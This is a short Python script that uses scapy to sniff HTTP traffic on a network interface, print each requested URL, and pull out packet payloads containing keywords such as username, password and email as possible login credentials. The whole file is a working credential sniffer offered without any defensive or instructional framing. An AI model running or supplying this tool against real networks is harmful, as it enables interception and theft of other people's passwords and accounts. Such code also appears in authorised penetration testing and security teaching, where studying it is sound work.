#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

# Function to sniff packets on a specified network interface
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# Function to extract the URL from an HTTP packet
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# Function to extract login information from a packet's payload
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ("username", "user", "login", "password", "pass", "email", "passwd")
        for keyword in keywords:
            if keyword in load:
                return load

# Function to process sniffed packets
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

# Specify the network interface to sniff on (e.g., "eth0")
sniff("eth0")
